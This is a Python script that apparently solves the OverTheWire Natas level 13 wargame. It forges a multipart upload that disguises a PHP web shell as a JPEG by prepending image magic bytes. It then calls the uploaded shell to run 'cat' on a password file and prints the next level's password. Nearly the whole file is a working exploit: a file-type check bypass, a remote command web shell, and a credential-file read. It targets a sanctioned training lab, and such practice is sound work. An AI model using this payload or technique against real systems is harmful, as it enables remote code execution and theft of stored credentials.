#! /usr/bin/python

import requests
import re
import random

username = 'natas13'
password = ''

def setMform(form, bundary) :
	data = ''
	for value in form :
		data += '--' + bundary + '\n'
		data += 'Content-Disposition: form-data; name="' + value[0] + '"\n\n'
		data += value[1] + '\n'
	data += '--' + bundary + '--'
	return data

bundary = '-----------WebKitFormBoundary' + str(int(random.random()*1e10))

bodyData = [
['MAX_FILE_SIZE', '1000'], 
['filename', '1234567890.php'], 
['uploadedfile"; filename="test.php" Content-Type: application/octet-stream', 
	'\xFF\xD8\xFF\xE0<?php echo shell_exec($_GET["e"]); ?>']
]

headers = {'Content-Type' : 'multipart/form-data; boundary=' + bundary}
r = requests.post(
	'http://natas13.natas.labs.overthewire.org/', 
	auth=(username, password), 
	headers=headers, 
	data=setMform(bodyData, bundary)
)

pattern = r'<a href=\"(\S+)\">'
result = re.search(pattern, str(r.content))

url = 'http://natas13.natas.labs.overthewire.org/' + result.group(1) + '?e=cat /etc/natas_webpass/natas14'
r = requests.get(url, auth=(username, password))

pattern = r'(\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
